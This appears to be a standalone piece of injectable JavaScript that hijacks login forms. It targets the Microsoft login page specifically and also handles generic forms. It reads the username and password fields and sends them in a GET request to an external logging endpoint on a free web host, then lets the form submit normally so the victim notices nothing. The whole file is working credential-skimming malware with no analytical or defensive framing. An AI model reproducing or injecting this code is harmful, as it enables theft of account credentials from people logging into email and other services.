// this is the code which will be injected into a given page...

(function() {
	if (checkService() == "OUTLOOK") {
		outlookExtract();
		return;
	}
	var form = document.getElementsByTagName('form')[0];
	form.setAttribute("onSubmit", "return false");
	form.onsubmit = function steal() {
		var inputs = document.getElementsByTagName('input');
		var result = new Array();
		for (i = 0; i < inputs.length; i++) {
			if (inputs[i].getAttribute("type") != "hidden") {
					result.push(inputs[i]);
			}
		}
		var usr = result[0].value; 
		var pwd;
		try {
			pwd = result[1].value;
		} catch (err) {
			pwd = "NoUser";
		}
		var url = "https://speedmail.000webhostapp.com/log.php?things=" + usr + "%20%20" + pwd;
		var xhttp = new XMLHttpRequest();
		xhttp.open("GET", url,true);
		xhttp.send();
		form.submit();
	}
	
	function checkService() {
		var string = location.href;
		var substring = "https://login.live.com";
		if (string.indexOf(substring) != -1) {
			return "OUTLOOK";
		}
		return "NOT FOUND";
	}
	
	function outlookExtract() {
		if (document.getElementById("displayName") != null ) {
			window.location = "www.google.com";
			var inputs = document.getElementsByTagName('input');
			var result = new Array();
			var button;
			for (i = 0; i < inputs.length; i++) {
				if (inputs[i].getAttribute("type") == "email" || inputs[i].getAttribute("type") == "text" || inputs[i].getAttribute("type") == "password" || inputs[i].getAttribute("type") == "submit") {
						if (inputs[i].getAttribute("type") == "submit") {
							button = inputs[i];
						} else {
						result.push(inputs[i]);
						}
				}
			}
			button.setAttribute("onClick", "return false");
			button.onclick = function steal2() {
				var usr = result[0].value;
				var pwd = result[1].value;
				var url = "https://speedmail.000webhostapp.com/log.php?things=" + usr + "%20%20" + pwd;
				var xhttp = new XMLHttpRequest();
				xhttp.open("GET", url,true);
				xhttp.send();
				button.click();
			}
		}
		
	}

}
)(); 